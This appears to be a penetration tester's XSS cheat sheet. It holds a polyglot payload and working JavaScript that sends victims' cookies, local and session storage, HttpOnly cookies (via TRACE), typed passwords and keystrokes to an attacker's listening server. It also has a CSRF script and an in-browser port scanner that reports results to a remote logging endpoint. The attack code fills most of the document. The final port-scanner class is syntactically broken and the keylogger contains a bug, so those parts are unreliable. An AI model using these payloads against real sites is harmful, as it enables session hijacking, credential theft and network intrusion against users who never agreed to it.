# XSS

List of exploitable JS functions: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

List of XSS payloads: [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all)

Polyglot field test

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

## Exploits

### Cookie Stealing

Create an instance of server listening on a public port. After sending the following payload to the target you will see a request to your server containing the session cookies

```
<script>
fetch('<listening server>', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### Local Storage Stealing

Same as Cookie Stealing but send the content of session or local storage to the listening server. The content of the storage has to be converted to JSON format

```
<script>
fetch('<listening server>', {
method: 'POST',
mode: 'no-cors',
body:JSON.stringify(localStorage)    //or sessionStorage
});
</script>
```

Obtain session from session storage

```
<script>
fetch('<listening server>', {
method: 'POST',
mode: 'no-cors',
body:sessionStorage.getItem('sessionID') 
});
</script>
```

### Cross Trace Scripting

By default cookies with the HTTPOnly attribute set to true are invisible to browser scripts because they are sent only through GET or POST HTTP(S) requests. In order to obtain these cookie we make the user send a TRACE request to the server&#x20;

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.withCredentials = true;
req.open('TRACE','<URL>',true);        #putting \r\nTRACE instead of TRACE might bypass some option filters
req.send();
function handleResponse() {
    fetch('<listening server>', {
            method: 'POST',
            mode: 'no-cors',
            body: this.getAllResponseHeaders()
        });
};
</script>
```

### Password Stealing

Create an instance of server listening on a public port. Send the following payload to create a fake form on the target server. When the victim types the password a request will be sent to your server containing the password

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('<listening server>',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### Keylogging

The following script sends the keys pressed by the user to the listening server

```
var keys = "";
document.onkeypress = function(e){
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    key += key;
}

window.setInterval(function(){
    if(keys && keys !== ""){
        var path = encodeURI("<listening server>?keys="+keys);
        new Image().src = path;
        keys = "";
    }
},<log interval ms>);
```

### CSRF

Use the following payload to send a request using AJAX to a page of the application. Can be used for instance to request  password reset for the user

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','<URL>',true);
req.send();
function handleResponse() {
    var target = new XMLHttpRequest();
    target .open('post', '/my-account/change-email', true);
    target .send(<body>)
};
</script>
```

### Network Scanner

TEMP

* [http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
* [http://www.xss-payloads.com/payloads/scripts/xhrportscan.js.html](http://www.xss-payloads.com/payloads/scripts/xhrportscan.js.html)

```
var ip ='192.168.80.1';
var start_port=1; var end_port=1024;
scan_ports();
var scan_type=1;
var port;
var blocked_ports = [0,1,7,9,11,13,15,17,19,20,21,22,23,25,37,42,43,53,77,79,87,95,101,102,103,104,109,110,111,113,115,117,119,123,135,139,143,179,389,465,512,513,514,515,526,530,531,532,540,556,563,587,601,636,993,995,2049,4045,6000];
var current_port=0;
var open_port_max=300;
var closed_port_max=2000;
var ps_open_ports=[];
var ps_closed_ports=[];
var ps_timeout_ports=[];
    var finaldata,logz;

function scan_ports()
{
    current_port=0;
    ps_open_ports=[];
    ps_closed_ports=[];
    ps_timeout_ports=[];
    reset_scan_out();
    
    setTimeout("scan_ports_xhr()",1);

}
    
   
function scan_ports_xhr()
{
    if(init_port_ps())
    {
    var res= encodeURIComponent(finaldata+logz);

    new Image().src = 'http://192.168.80.1:5005/ilog.php?log='+res;
    return;
    }
    if(is_blocked(current_port))
    {
       log(current_port + "  - blocked port");
       setTimeout("scan_ports_xhr()",1);
       return;
    }
    start_time = (new Date).getTime();
    try
    {
        xhr = new XMLHttpRequest();
        xhr.open('GET', "http://" + ip + ":" + current_port);
        xhr.send();
        setTimeout("check_ps_xhr()",5);
    }
    catch(err)
    {
        
    }
            
}

function check_ps_xhr()
{
    var interval = (new Date).getTime() - start_time;
    if(xhr.readyState == 1)
    {
        if(interval > closed_port_max)
        {
            log(current_port + " - time exceeded");
            ps_timeout_ports.push(current_port);
            setTimeout("scan_ports_xhr()",1);
        }
        else
        {
            setTimeout("check_ps_xhr()",5);
        }
    }
    else
    {
        if(interval < open_port_max)
        {
            log(current_port + " - open");
            ps_open_ports.push(current_port);
        }
        else
        {
            log(current_port + " - closed");
            ps_closed_ports.push(current_port);
        }
        setTimeout("scan_ports_xhr()",1);
    }
    
}

function init_port_ps()
{
    if(current_port == 0)
    {
        current_port = start_port;
    }
    else if(current_port == end_port)
    {
        results_ps();
        return true;
    }
    else
    {
        current_port++;
    }
    return false;
}

function is_blocked(port_no)
{
    for(var i=0;i<blocked_ports.length;i++)
    {
        if(blocked_ports[i] == port_no)
        {
            return true;
        }
    }
    return false;
}
    function results_ps()
{
   finaldata = "<br><b>Open Ports:</b><br>" + ps_open_ports + "<br><br><b>Closed/Blocked Ports:</b><br>" + ps_closed_ports + "<br><br><b>Filtered/Application Type 3&4 Ports:</b><br>" + ps_timeout_ports + "<br><br>";

}

function log(to_log)
{
    logz += to_log + ", ";
}

function reset_scan_out()
{
    data="";
            logz=""
}















let class portScan{
    constructor(ipStart, ipEnd, ports, timeout, relayAddr, relayOnce){
        this.ipStart = ipStart;
        this.ipEnd = ipEnd;
        this.ipCurr = ipStart.split(".");
        this.ports = ports ? ports : [21,22,25,80,111,443,8080,4445]
        this.portIdx = 0
        this.relayAddr = relayAddr;
        this.relayOnce = relayOnce ? true : false;
        this.timeout = timeout ? timeout : 3000
    }
    
    this.function relay(msg){
        if(this.relayAddr){
            fetch(this.relayAddr, {
    	        method: 'POST',
                body: msg
    	    });
	}
    }
    
    this.incrementIp(){
        currIp = this.ipCurrent
        currIp[3]++;
        for(var i=3;i>=0;i--){
            if(currIp[i] == 255){
                currIp[i] = 0;
                currIp[i-1]++;
            }
        }
        this.ipCurrent = currIp;
    }
    
    this.generateAddress(ipCurrent,port){
        return ipCurrent.join(".")+":"+port;
        return addr;
    }
    
    this.scanner(){
        startTime= (new Date).getTime();
        xhr = new XMLHttpRequest();
        xhr.open('GET', this.generateAddress(this.ipCurr, this.portIdx));
        xhr.send();
    }
}
```
